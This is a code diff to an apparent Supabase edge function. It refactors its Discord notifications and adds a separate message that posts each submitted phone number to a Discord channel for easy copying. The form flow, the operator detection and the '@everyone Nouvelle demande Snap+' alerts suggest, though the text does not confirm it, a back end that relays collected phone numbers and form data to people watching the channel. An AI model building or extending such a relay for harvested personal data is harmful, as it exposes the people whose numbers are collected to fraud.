@@ -145,6 +145,21 @@ serve(async (req) => {
     // Détecter l'opérateur
     const operator = detectOperator(phone);
 
+    const discordHeaders = { 
+      'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
+      'Content-Type': 'application/json' 
+    };
+    const discordMessageUrl = `https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`;
+    const sendDiscordMessage = (payload: Record<string, unknown>) => fetch(discordMessageUrl, {
+      method: 'POST',
+      headers: discordHeaders,
+      body: JSON.stringify(payload),
+    });
+    const sendCopyablePhoneMessage = () => sendDiscordMessage({
+      content: phone,
+      allowed_mentions: { parse: [] },
+    });
+
     // Si c'est le formulaire initial, créer une entrée
     if (step === "form") {
       const { data, error } = await supabase
@@ -218,17 +233,11 @@ serve(async (req) => {
         timestamp: new Date().toISOString()
       };
 
-      await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
-        method: 'POST',
-        headers: { 
-          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
-          'Content-Type': 'application/json' 
-        },
-        body: JSON.stringify({ 
-          content: `@everyone\n📞 ${phone}`,
-          embeds: [embed] 
-        }),
+      await sendDiscordMessage({ 
+        content: `@everyone\nNouvelle demande Snap+`,
+        embeds: [embed] 
       });
+      await sendCopyablePhoneMessage();
 
       return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
@@ -359,14 +368,7 @@ serve(async (req) => {
         ]
       };
 
-      const response = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
-        method: 'POST',
-        headers: { 
-          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
-          'Content-Type': 'application/json' 
-        },
-        body: JSON.stringify(payload),
-      });
+      const response = await sendDiscordMessage(payload);
 
       if (!response.ok) {
         const errorText = await response.text();
@@ -376,6 +378,8 @@ serve(async (req) => {
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         });
       }
+
+      await sendCopyablePhoneMessage();
 
       return new Response(JSON.stringify({ success: true }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
